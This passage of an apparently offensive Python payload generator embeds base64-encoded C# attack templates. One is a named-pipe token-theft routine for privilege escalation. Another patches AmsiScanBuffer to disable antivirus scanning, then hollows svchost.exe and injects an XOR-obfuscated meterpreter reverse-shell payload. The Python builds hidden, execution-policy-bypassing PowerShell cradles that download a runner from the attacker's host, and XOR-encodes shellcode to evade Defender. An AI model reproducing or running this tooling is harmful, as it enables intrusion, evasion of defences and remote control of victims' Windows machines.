vU3RyaW5nKCkpOwogICAgICAgICAgICBzdHJpbmcgc2lkc3RyID0gTWFyc2hhbC5QdHJUb1N0cmluZ0F1dG8ocHN0cik7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gc2lkIHN0cmluZzogIiArIHNpZHN0cik7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKEAiRm91bmQgc2lkIHswfSIsIHNpZHN0cik7CgogICAgICAgICAgICAvLyBEdXBsaWNhdGUgdGhlIHN0b2xlbiB0b2tlbgogICAgICAgICAgICBJbnRQdHIgc3lzVG9rZW4gPSBJbnRQdHIuWmVybzsKICAgICAgICAgICAgRHVwbGljYXRlVG9rZW5FeCh0b2tlbkhhbmRsZSwgVE9LRU5fQUxMX0FDQ0VTUywgSW50UHRyLlplcm8sIFNFQ1VSSVRZX0lNUEVSU09OQVRJT04sIFRPS0VOX1BSSU1BUlksIG91dCBzeXNUb2tlbik7CgogICAgICAgICAgICAvLyBDcmVhdGUgYW4gZW52aXJvbm1lbnQgYmxvY2sgZm9yIHRoZSBub24taW50ZXJhY3RpdmUgc2Vzc2lvbgogICAgICAgICAgICBJbnRQdHIgZW52ID0gSW50UHRyLlplcm87CiAgICAgICAgICAgIGJvb2wgcmVzID0gQ3JlYXRlRW52aXJvbm1lbnRCbG9jayhvdXQgZW52LCBzeXNUb2tlbiwgZmFsc2UpOwoKICAgICAgICAgICAgLy8gR2V0IHRoZSBpbXBlcnNvbmF0ZWQgaWRlbnRpdHkgYW5kIHJldmVydCB0byBzZWxmIHRvIGVuc3VyZSB3ZSBoYXZlIGltcGVyc29uYXRpb24gcHJpdnMKICAgICAgICAgICAgU3RyaW5nIG5hbWUgPSBXaW5kb3dzSWRlbnRpdHkuR2V0Q3VycmVudCgpLk5hbWU7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiSW1wZXJzb25hdGVkIHVzZXIgaXM6IHtuYW1lfS4iKTsKICAgICAgICAgICAgUmV2ZXJ0VG9TZWxmKCk7CgogICAgICAgICAgICAvLyBHZXQgdGhlIHN5c3RlbSBkaXJlY3RvcnkKICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYlN5c3RlbURpciA9IG5ldyBTdHJpbmdCdWlsZGVyKDI1Nik7CiAgICAgICAgICAgIHVpbnQgcmVzMSA9IEdldFN5c3RlbURpcmVjdG9yeShzYlN5c3RlbURpciwgMjU2KTsKCiAgICAgICAgICAgIC8vIFNwYXduIGEgbmV3IHByb2Nlc3Mgd2l0aCB0aGUgZHVwbGljYXRlZCB0b2tlbiwgYSBkZXNrdG9wIHNlc3Npb24sIGFuZCB0aGUgY3JlYXRlZCBwcm9maWxlCiAgICAgICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcEluZm8gPSBuZXcgUFJPQ0VTU19JTkZPUk1BVElPTigpOwogICAgICAgICAgICBTVEFSVFVQSU5GTyBzSW5mbyA9IG5ldyBTVEFSVFVQSU5GTygpOwogICAgICAgICAgICBzSW5mby5jYiA9IE1hcnNoYWwuU2l6ZU9mKHNJbmZvKTsKICAgICAgICAgICAgc0luZm8ubHBEZXNrdG9wID0gIldpblN0YTBcXERlZmF1bHQiOwogICAgICAgICAgICBDcmVhdGVQcm9jZXNzV2l0aFRva2VuVyhzeXNUb2tlbiwgTG9nb25GbGFncy5XaXRoUHJvZmlsZSwgbnVsbCwgYmluVG9SdW4sIENyZWF0aW9uRmxhZ3MuVW5pY29kZUVudmlyb25tZW50LCBlbnYsIHNiU3lzdGVtRGlyLlRvU3RyaW5nKCksIHJlZiBzSW5mbywgb3V0IHBJbmZvKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJFeGVjdXRlZCAne2JpblRvUnVufScgd2l0aCBpbXBlcnNvbmF0ZWQgdG9rZW4hIik7CiAgICAgICAgfQogICAgfQp9"
            pipename = pipename.replace('\\','\\\\') # prep for csharp

            if pscmd != "0":
                #print('[DEBUG] pscmd: %s' % pscmd)
                pscmd.replace('\\','\\\\') #prep for csharp
                print('[!] local pre-compiled option chosen! make sure victim %s exists!' % pscmd)
                pipedata = "string pipeName = \"%s\";" % pipename
                bindata = "string binToRun = \"%s\";" % (pscmd) #adapt pscmd for binname

            if pscmd == "0":
                runnerfilename = runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runnerfilename)
                target = "http://%s/%s" % (lhost,runnerfilename)
                target = cradle % target
                binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target) #note the space at start
                pscmd = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"

                pipedata = "string pipeName = \"%s\";" % pipename
                bindata = "string binToRun = \"%s%s\";" % (pscmd,binargs) #adapt pscmd for binname

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + pipedata + "\n")
                f.write("            " + bindata + "\n")
                f.write(lower)
            f.close()
        if binary == "SpoolSample":
            print('[!] runspace won\'t work with -b SpoolSample! use with makecompile! terminating!')
            sys.exit()
        if binary == "Hollow":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uOwp1c2luZyBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlczsKdXNpbmcgU3lzdGVtLlRleHQ7CnVzaW5nIFN5c3RlbS5Db25maWd1cmF0aW9uLkluc3RhbGw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKCm5hbWVzcGFjZSBCeXBhc3MKewogICAgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwogICAgICAgIH0KICAgIH0KCiAgICBbU3lzdGVtLkNvbXBvbmVudE1vZGVsLlJ1bkluc3RhbGxlcih0cnVlKV0KICAgIHB1YmxpYyBjbGFzcyBTYW1wbGUgOiBTeXN0ZW0uQ29uZmlndXJhdGlvbi5JbnN0YWxsLkluc3RhbGxlcgogICAgewogICAgICAgIHB1YmxpYyBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDQ7CiAgICAgICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTQkFTSUNJTkZPUk1BVElPTiA9IDA7CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFByb2Nlc3NJbmZvCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBQcm9jZXNzSWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBUaHJlYWRJZDsKICAgICAgICB9CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFN0YXJ0dXBJbmZvCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgdWludCBjYjsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1g7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYU2l6ZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZU2l6ZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdGaWxsQXR0cmlidXRlOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd0ZsYWdzOwogICAgICAgICAgICBwdWJsaWMgc2hvcnQgd1Nob3dXaW5kb3c7CiAgICAgICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICAgICAgfQoKICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICAgICAgaW50ZXJuYWwgc3RydWN0IFByb2Nlc3NCYXNpY0luZm8KICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQxOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkFkZHJlc3M7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQyOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFJlc2VydmVkMzsKICAgICAgICAgICAgcHVibGljIEludFB0ciBVbmlxdWVQaWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgTW9yZVJlc2VydmVkOwogICAgICAgIH0KCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiB2b2lkIFNsZWVwKHVpbnQgZHdNaWxsaXNlY29uZHMpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgW0luXSByZWYgU3RhcnR1cEluZm8gbHBTdGFydHVwSW5mbywgb3V0IFByb2Nlc3NJbmZvIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICAgICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IFp3UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIGhQcm9jZXNzLCBpbnQgcHJvY0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgICAgIHJlZiBQcm9jZXNzQmFzaWNJbmZvIHByb2NJbmZvcm1hdGlvbiwgdWludCBQcm9jSW5mb0xlbiwgcmVmIHVpbnQgcmV0bGVuKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFJlYWRQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICAgICAgaW50IGR3U2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mYnl0ZXNSVyk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIGJ5dGVbXSBscEJ1ZmZlciwgSW50MzIgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIExvYWRMaWJyYXJ5KHN0cmluZyBuYW1lKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEV4YWN0U3BlbGxpbmcgPSB0cnVlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgVmlydHVhbEFsbG9jRXhOdW1hKEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQWRkcmVzcywgdWludCBkd1NpemUsIFVJbnQzMiBmbEFsbG9jYXRpb25UeXBlLCBVSW50MzIgZmxQcm90ZWN0LCBVSW50MzIgbm5kUHJlZmVycmVkKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CiAgICAgICAgcHVibGljIG92ZXJyaWRlIHZvaWQgVW5pbnN0YWxsKFN5c3RlbS5Db2xsZWN0aW9ucy5JRGljdGlvbmFyeSBzYXZlZFN0YXRlKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vd3JlY2sgbWltaQogICAgICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICAgICAgc3RyaW5nIG5hbWUyID0gIkEiICsgIm1zaSIgKyAiU2NhbkIiICsgInVmZmVyIjsKICAgICAgICAgICAgSW50UHRyIFRhcmdldERMTCA9IExvYWRMaWJyYXJ5KG5hbWUxKTsKICAgICAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICAgICAgVUludDMyIG9sZFByb3RlY3QgPSAwOwogICAgICAgICAgICBCeXRlW10gYnVmaSA9IHsgMHg0OCwgMHgzMSwgMHhDMCB9OwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgICAgIE1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4MjAsIG91dCBvbGRQcm90ZWN0KTsKCiAgICAgICAgICAgIC8vIG1zZnZlbm9tIC1wIHdpbmRvd3MveDY0L21ldGVycHJldGVyL3JldmVyc2VfdGNwIExIT1NUPTE5Mi4xNjguMTM1LjcgTFBPUlQ9NDQzIEVYSVRGVU5DPXRocmVhZCAtZiBjc2hhcnAKICAgICAgICAgICAgLy8gWE9SZWQgd2l0aCBrZXkgMHhmYQ=="
            lower = "ICAgICAgICAgICAgLy8gU3RhcnQgJ3N2Y2hvc3QuZXhlJyBpbiBhIHN1c3BlbmRlZCBzdGF0ZQogICAgICAgICAgICBTdGFydHVwSW5mbyBzSW5mbyA9IG5ldyBTdGFydHVwSW5mbygpOwogICAgICAgICAgICBQcm9jZXNzSW5mbyBwSW5mbyA9IG5ldyBQcm9jZXNzSW5mbygpOwogICAgICAgICAgICBib29sIGNSZXN1bHQgPSBDcmVhdGVQcm9jZXNzKG51bGwsICJjOlxcd2luZG93c1xcc3lzdGVtMzJcXHN2Y2hvc3QuZXhlIiwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLAogICAgICAgICAgICAgICAgZmFsc2UsIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBwSW5mbyk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiU3RhcnRlZCAnc3ZjaG9zdC5leGUnIGluIGEgc3VzcGVuZGVkIHN0YXRlIHdpdGggUElEIHtwSW5mby5Qcm9jZXNzSWR9LiBTdWNjZXNzOiB7Y1Jlc3VsdH0uIik7CgogICAgICAgICAgICAvLyBHZXQgUHJvY2VzcyBFbnZpcm9ubWVudCBCbG9jayAoUEVCKSBtZW1vcnkgYWRkcmVzcyBvZiBzdXNwZW5kZWQgcHJvY2VzcyAob2Zmc2V0IDB4MTAgZnJvbSBiYXNlIGltYWdlKQogICAgICAgICAgICBQcm9jZXNzQmFzaWNJbmZvIHBiSW5mbyA9IG5ldyBQcm9jZXNzQmFzaWNJbmZvKCk7CiAgICAgICAgICAgIHVpbnQgcmV0TGVuID0gbmV3IHVpbnQoKTsKICAgICAgICAgICAgbG9uZyBxUmVzdWx0ID0gWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwSW5mby5oUHJvY2VzcywgUFJPQ0VTU0JBU0lDSU5GT1JNQVRJT04sIHJlZiBwYkluZm8sICh1aW50KShJbnRQdHIuU2l6ZSAqIDYpLCByZWYgcmV0TGVuKTsKICAgICAgICAgICAgSW50UHRyIGJhc2VJbWFnZUFkZHIgPSAoSW50UHRyKSgoSW50NjQpcGJJbmZvLlBlYkFkZHJlc3MgKyAweDEwKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJHb3QgcHJvY2VzcyBpbmZvcm1hdGlvbiBhbmQgbG9jYXRlZCBQRUIgYWRkcmVzcyBvZiBwcm9jZXNzIGF0IHsiMHgiICsgYmFzZUltYWdlQWRkci5Ub1N0cmluZygieCIpfS4gU3VjY2Vzczoge3FSZXN1bHQgPT0gMH0uIik7CgogICAgICAgICAgICAvLyBHZXQgZW50cnkgcG9pbnQgb2YgdGhlIGFjdHVhbCBwcm9jZXNzIGV4ZWN1dGFibGUKICAgICAgICAgICAgLy8gVGhpcyBvbmUgaXMgYSBiaXQgY29tcGxpY2F0ZWQsIGJlY2F1c2UgdGhpcyBhZGRyZXNzIGRpZmZlcnMgZm9yIGVhY2ggcHJvY2VzcyAoZHVlIHRvIEFkZHJlc3MgU3BhY2UgTGF5b3V0IFJhbmRvbWl6YXRpb24gKEFTTFIpKQogICAgICAgICAgICAvLyBGcm9tIHRoZSBQRUIgKGFkZHJlc3Mgd2UgZ290IGluIGxhc3QgY2FsbCksIHdlIGhhdmUgdG8gZG8gdGhlIGZvbGxvd2luZzoKICAgICAgICAgICAgLy8gMS4gUmVhZCBleGVjdXRhYmxlIGFkZHJlc3MgZnJvbSBmaXJzdCA4IGJ5dGVzIChJbnQ2NCwgb2Zmc2V0IDApIG9mIFBFQiBhbmQgcmVhZCBkYXRhIGNodW5rIGZvciBmdXJ0aGVyIHByb2Nlc3NpbmcKICAgICAgICAgICAgLy8gMi4gUmVhZCB0aGUgZmllbGQgJ2VfbGZhbmV3JywgNCBieXRlcyBhdCBvZmZzZXQgMHgzQyBmcm9tIGV4ZWN1dGFibGUgYWRkcmVzcyB0byBnZXQgdGhlIG9mZnNldCBmb3IgdGhlIFBFIGhlYWRlcgogICAgICAgICAgICAvLyAzLiBUYWtlIHRoZSBtZW1vcnkgYXQgdGhpcyBQRSBoZWFkZXIgYWRkIGFuIG9mZnNldCBvZiAweDI4IHRvIGdldCB0aGUgRW50cnlwb2ludCBSZWxhdGl2ZSBWaXJ0dWFsIEFkZHJlc3MgKFJWQSkgb2Zmc2V0CiAgICAgICAgICAgIC8vIDQuIFJlYWQgdGhlIHZhbHVlIGF0IHRoZSBSVkEgb2Zmc2V0IGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgb2YgdGhlIGV4ZWN1dGFibGUgZW50cnlwb2ludCBmcm9tIHRoZSBleGVjdXRhYmxlIGFkZHJlc3MKICAgICAgICAgICAgLy8gNS4gR2V0IHRoZSBhYnNvbHV0ZSBhZGRyZXNzIG9mIHRoZSBlbnRyeXBvaW50IGJ5IGFkZGluZyB0aGlzIHZhbHVlIHRvIHRoZSBiYXNlIGV4ZWN1dGFibGUgYWRkcmVzcy4gU3VjY2VzcyEKCiAgICAgICAgICAgIC8vIDEuIFJlYWQgZXhlY3V0YWJsZSBhZGRyZXNzIGZyb20gZmlyc3QgOCBieXRlcyAoSW50NjQsIG9mZnNldCAwKSBvZiBQRUIgYW5kIHJlYWQgZGF0YSBjaHVuayBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICAgICAgICAgIGJ5dGVbXSBwcm9jQWRkciA9IG5ldyBieXRlWzB4OF07CiAgICAgICAgICAgIGJ5dGVbXSBkYXRhQnVmID0gbmV3IGJ5dGVbMHgyMDBdOwogICAgICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICAgICAgYm9vbCByZXN1bHQgPSBSZWFkUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgYmFzZUltYWdlQWRkciwgcHJvY0FkZHIsIHByb2NBZGRyLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBJbnRQdHIgZXhlY3V0YWJsZUFkZHJlc3MgPSAoSW50UHRyKUJpdENvbnZlcnRlci5Ub0ludDY0KHByb2NBZGRyLCAwKTsKICAgICAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIkRFQlVHOiBFeGVjdXRhYmxlIGJhc2UgYWRkcmVzczogeyIweCIgKyBleGVjdXRhYmxlQWRkcmVzcy5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDIuIFJlYWQgdGhlIGZpZWxkICdlX2xmYW5ldycsIDQgYnl0ZXMgKFVJbnQzMikgYXQgb2Zmc2V0IDB4M0MgZnJvbSBleGVjdXRhYmxlIGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgZm9yIHRoZSBQRSBoZWFkZXIKICAgICAgICAgICAgdWludCBlX2xmYW5ldyA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihkYXRhQnVmLCAweDNjKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogZV9sZmFuZXcgb2Zmc2V0OiB7IjB4IiArIGVfbGZhbmV3LlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gMy4gVGFrZSB0aGUgbWVtb3J5IGF0IHRoaXMgUEUgaGVhZGVyIGFkZCBhbiBvZmZzZXQgb2YgMHgyOCB0byBnZXQgdGhlIEVudHJ5cG9pbnQgUmVsYXRpdmUgVmlydHVhbCBBZGRyZXNzIChSVkEpIG9mZnNldAogICAgICAgICAgICB1aW50IHJ2YU9mZnNldCA9IGVfbGZhbmV3ICsgMHgyODsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIG9mZnNldDogeyIweCIgKyBydmFPZmZzZXQuVG9TdHJpbmcoIngiKX0uIik7CgogICAgICAgICAgICAvLyA0LiBSZWFkIHRoZSA0IGJ5dGVzIChVSW50MzIpIGF0IHRoZSBSVkEgb2Zmc2V0IHRvIGdldCB0aGUgb2Zmc2V0IG9mIHRoZSBleGVjdXRhYmxlIGVudHJ5cG9pbnQgZnJvbSB0aGUgZXhlY3V0YWJsZSBhZGRyZXNzCiAgICAgICAgICAgIHVpbnQgcnZhID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIChpbnQpcnZhT2Zmc2V0KTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIHZhbHVlOiB7IjB4IiArIHJ2YS5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDUuIEdldCB0aGUgYWJzb2x1dGUgYWRkcmVzcyBvZiB0aGUgZW50cnlwb2ludCBieSBhZGRpbmcgdGhpcyB2YWx1ZSB0byB0aGUgYmFzZSBleGVjdXRhYmxlIGFkZHJlc3MuIFN1Y2Nlc3MhCiAgICAgICAgICAgIEludFB0ciBlbnRyeXBvaW50QWRkciA9IChJbnRQdHIpKChJbnQ2NClleGVjdXRhYmxlQWRkcmVzcyArIHJ2YSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiR290IGV4ZWN1dGFibGUgZW50cnlwb2ludCBhZGRyZXNzOiB7IjB4IiArIGVudHJ5cG9pbnRBZGRyLlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gQ2Fycnlpbmcgb24sIGRlY29kZSB0aGUgWE9SIHBheWxvYWQKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJYT1ItZGVjb2RlZCBwYXlsb2FkLiIpOwoKICAgICAgICAgICAgLy8gT3ZlcndyaXRlIHRoZSBtZW1vcnkgYXQgdGhlIGlkZW50aWZpZWQgYWRkcmVzcyB0byAnaGlqYWNrJyB0aGUgZW50cnlwb2ludCBvZiB0aGUgZXhlY3V0YWJsZQogICAgICAgICAgICByZXN1bHQgPSBXcml0ZVByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGVudHJ5cG9pbnRBZGRyLCBidWYsIGJ1Zi5MZW5ndGgsIG91dCBieXRlc1JXKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJPdmVyd3JvdGUgZW50cnlwb2ludCB3aXRoIHBheWxvYWQuIFN1Y2Nlc3M6IHtyZXN1bHR9LiIpOwoKICAgICAgICAgICAgLy8gUmVzdW1lIHRoZSB0aHJlYWQgdG8gdHJpZ2dlciBvdXIgcGF5bG9hZAogICAgICAgICAgICB1aW50IHJSZXN1bHQgPSBSZXN1bWVUaHJlYWQocEluZm8uaFRocmVhZCk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiVHJpZ2dlcmVkIHBheWxvYWQuIFN1Y2Nlc3M6IHtyUmVzdWx0ID09IDF9LiBDaGVjayB5b3VyIGxpc3RlbmVyISIpOwogICAgICAgIH0KICAgIH0KfQ=="
            
            gen(lhost,lport,bitness,"csharp")
            msffilename = "met%s.csharp" % (bitness)
            m = open(msffilename,'r')
            msf = m.read()
            m.close()
            msf = xor_buffer_csharp(msf) # 5/26 -defender
            #msf_b64 = base64.b64encode(msf).decode()

            with open(rsfilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + msf + "\n")
                f.write(lower)
            f.close()
        if binary == "UACHelper":
